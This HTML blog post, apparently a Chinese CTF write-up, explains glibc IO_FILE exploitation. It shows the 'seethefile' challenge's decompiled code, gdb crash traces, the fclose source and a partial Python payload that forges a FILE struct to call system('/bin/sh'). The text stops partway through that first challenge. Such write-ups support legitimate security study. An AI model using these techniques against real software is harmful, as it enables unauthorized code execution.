<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="IO_FILE Pwn 利用整理">
<meta property="og:url" content="https://bestwing.me/IO_FILE_Pwn.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1e7f7308e71144576ac01a57aba29c81-0cc709.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-7f5bc134159fa9de3f62d26bfa1be167-f84fbf.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-6f46dd1423c89ffd91bc0d878db255f5-4ba611.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-4128a667b72278b7487ad17e90278547-57b582.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-31577117eac8c1f7b307fac7d526993a-51f0a9.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-524f4d9b37762df53ce512d909d094bb-e657f3.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1da6fe6aac1d5307475c7d14d5bc72b5-e1e753.png">
<meta property="article:published_time" content="2019-03-20T16:00:00.000Z">
<meta property="article:modified_time" content="2024-02-28T07:02:51.000Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="IO_FILE Pwn">
<meta property="article:tag" content="houseoforange">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1e7f7308e71144576ac01a57aba29c81-0cc709.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>IO_FILE Pwn 利用整理</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/ASan-and-ASan-in-CTF(0ctf-babyaegis).html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/CVE-2019-5736-Docker-escape.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/IO_FILE_Pwn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/IO_FILE_Pwn.html&text=IO_FILE Pwn 利用整理"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/IO_FILE_Pwn.html&is_video=false&description=IO_FILE Pwn 利用整理"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IO_FILE Pwn 利用整理&body=Check out this article: https://bestwing.me/IO_FILE_Pwn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/IO_FILE_Pwn.html&name=IO_FILE Pwn 利用整理&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/IO_FILE_Pwn.html&t=IO_FILE Pwn 利用整理"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-houseoforange"><span class="toc-number"></span> <span class="toc-text">0x02 houseoforange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#overwrite-the-top-chunk"><span class="toc-number">3.1.</span> <span class="toc-text">overwrite the top chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trigger-int-free"><span class="toc-number">3.2.</span> <span class="toc-text">trigger _int_free()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#build-a-large-chunk-and-info-leak"><span class="toc-number">3.3.</span> <span class="toc-text">build a large chunk and info leak</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Stream-Oriented-Programming%EF%BC%88FSOP%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">File Stream Oriented Programming（FSOP）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-number">4.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-houseoforange-glibc-2-24-bypass"><span class="toc-number"></span> <span class="toc-text">0x03 houseoforange (glibc 2.24 bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-str-jumps-gt-overflow"><span class="toc-number">1.</span> <span class="toc-text">_IO_str_jumps -&gt; overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-str-jumps-gt-finish"><span class="toc-number">2.</span> <span class="toc-text">_IO_str_jumps -&gt; finish</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BB%A5%E5%8F%8Afileno%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">0x04 缓冲区以及fileno的利用</span></a>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        IO_FILE Pwn 利用整理
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-03-20T16:00:00.000Z" itemprop="datePublished">2019-03-21</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Summary/">Summary</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/IO-FILE-Pwn/" rel="tag">IO_FILE Pwn</a>, <a class="tag-link-link" href="/tags/houseoforange/" rel="tag">houseoforange</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="0x01-seethefile"><a href="#0x01-seethefile" class="headerlink" title="0x01 seethefile"></a>0x01 seethefile</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序主要有以下功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">     openfile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">     readfile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">     writefile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">     closefile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">     __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;name);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, &amp;name);</span><br><span class="line">     <span class="keyword">if</span> ( fp )</span><br><span class="line">       fclose(fp);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>



<p>功能如其名，就不复述了，一些功能做了一点check。漏洞主要是两个</p>
<ul>
<li>nptr 栈溢出</li>
</ul>
<p>​    <code>__isoc99_scanf(&quot;%s&quot;, &amp;nptr);</code> 溢出发生在栈上</p>
<ul>
<li>name 溢出</li>
</ul>
<p>​       <code>·__isoc99_scanf(&quot;%s&quot;, &amp;name);            // overflow in bss</code></p>
<p>通过 checksec ，我们发现有canary ，栈溢出需要 bypass canary才能利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/pwn/seethefile&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>



<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>当我们咋输入name的时候输入一段长的字符串的时候，在 fclose 会发生报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0xffffffff</span><br><span class="line">EDX: 0xf7fca870 --&gt; 0x0</span><br><span class="line">ESI: 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">EDI: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">EBP: 0xffffd6b8 --&gt; 0xffffd708 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd690 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:	add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e749f7 (&lt;_IO_new_fclose+23&gt;:	cmp    BYTE PTR [esi+0x46],0x0)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e749eb &lt;_IO_new_fclose+11&gt;:	add    ebx,0x154615</span><br><span class="line">   0xf7e749f1 &lt;_IO_new_fclose+17&gt;:	sub    esp,0x1c</span><br><span class="line">   0xf7e749f4 &lt;_IO_new_fclose+20&gt;:	mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">=&gt; 0xf7e749f7 &lt;_IO_new_fclose+23&gt;:	cmp    BYTE PTR [esi+0x46],0x0</span><br><span class="line">   0xf7e749fb &lt;_IO_new_fclose+27&gt;:	jne    0xf7e74ba0 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0xf7e74a01 &lt;_IO_new_fclose+33&gt;:	mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a03 &lt;_IO_new_fclose+35&gt;:	<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a06 &lt;_IO_new_fclose+38&gt;:	jne    0xf7e74b80 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd690 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:	add    esi,0x15815)</span><br><span class="line">0004| 0xffffd694 --&gt; 0x0</span><br><span class="line">0008| 0xffffd698 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0012| 0xffffd69c --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0016| 0xffffd6a0 --&gt; 0xffffd708 --&gt; 0x0</span><br><span class="line">0020| 0xffffd6a4 --&gt; 0xf7fee010 (&lt;_dl_runtime_resolve+16&gt;:	pop    edx)</span><br><span class="line">0024| 0xffffd6a8 --&gt; 0xf7e749eb (&lt;_IO_new_fclose+11&gt;:	add    ebx,0x154615)</span><br><span class="line">0028| 0xffffd6ac --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">_IO_new_fclose (fp=0x61616161) at iofclose.c:48</span><br><span class="line">48	iofclose.c: No such file or directory.</span><br></pre></td></tr></table></figure>



<p>我们会发现 fp 指针被覆盖成了_IO_new_fclose —&gt; fp =  0x61616161</p>
<p>回顾下 fclose的知识点：</p>
<p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">        _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line">versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);</span><br><span class="line">strong_alias (_IO_new_fclose, __new_fclose)</span><br><span class="line">versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);</span><br></pre></td></tr></table></figure>



<p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>

<p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>

<p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure>



<p>根据调用流程，我们需要fake 一个io file ，所以首先，我们将 fp-&gt; name buffer，因为这是我们可以控制的数据流。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1e7f7308e71144576ac01a57aba29c81-0cc709.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-1e7f7308e71144576ac01a57aba29c81-0cc709.png" alt="img"></a></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-7f5bc134159fa9de3f62d26bfa1be167-f84fbf.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-7f5bc134159fa9de3f62d26bfa1be167-f84fbf.png" alt="img"></a></p>
<p>根据调试我们可以知道，我们需要构造的结构如下：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-6f46dd1423c89ffd91bc0d878db255f5-4ba611.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-6f46dd1423c89ffd91bc0d878db255f5-4ba611.png" alt="img"></a></p>
<p>记录下调试过程：</p>
<ul>
<li><p>覆盖 *fp</p>
<p>Payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>此时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e749eb &lt;_IO_new_fclose+11&gt;:	add    ebx,0x154615</span><br><span class="line">   0xf7e749f1 &lt;_IO_new_fclose+17&gt;:	sub    esp,0x1c</span><br><span class="line">   0xf7e749f4 &lt;_IO_new_fclose+20&gt;:	mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">=&gt; 0xf7e749f7 &lt;_IO_new_fclose+23&gt;:	cmp    BYTE PTR [esi+0x46],0x0</span><br><span class="line">   0xf7e749fb &lt;_IO_new_fclose+27&gt;:	jne    0xf7e74ba0 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0xf7e74a01 &lt;_IO_new_fclose+33&gt;:	mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a03 &lt;_IO_new_fclose+35&gt;:	<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a06 &lt;_IO_new_fclose+38&gt;:	jne    0xf7e74b80 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:	add    esi,0x15815)</span><br><span class="line">0004| 0xffffd704 --&gt; 0x0</span><br><span class="line">0008| 0xffffd708 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0012| 0xffffd70c --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0016| 0xffffd710 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">0020| 0xffffd714 --&gt; 0xf7fee010 (&lt;_dl_runtime_resolve+16&gt;:	pop    edx)</span><br><span class="line">0024| 0xffffd718 --&gt; 0xf7e749eb (&lt;_IO_new_fclose+11&gt;:	add    ebx,0x154615)</span><br><span class="line">0028| 0xffffd71c --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">_IO_new_fclose (fp=0x804b260 &lt;name&gt;) at iofclose.c:48</span><br><span class="line">48	iofclose.c: No such file or directory.</span><br><span class="line">gdb-peda$ telescope <span class="variable">$esi</span>+0x46</span><br><span class="line">0000| 0x804b2a6 --&gt; 0x0</span><br><span class="line">0004| 0x804b2aa --&gt; 0x0</span><br><span class="line">0008| 0x804b2ae --&gt; 0x0</span><br><span class="line">0012| 0x804b2b2 --&gt; 0x0</span><br><span class="line">0016| 0x804b2b6 --&gt; 0x0</span><br><span class="line">0020| 0x804b2ba --&gt; 0x0</span><br><span class="line">0024| 0x804b2be --&gt; 0x0</span><br><span class="line">0028| 0x804b2c2 --&gt; 0x0</span><br></pre></td></tr></table></figure>

<p><code>cmp    BYTE PTR [esi+0x46],0x0</code> ,  取[esi+0x46] 低位一byte的值，此时值为0，则 CMP 成立，不会跳转。</p>
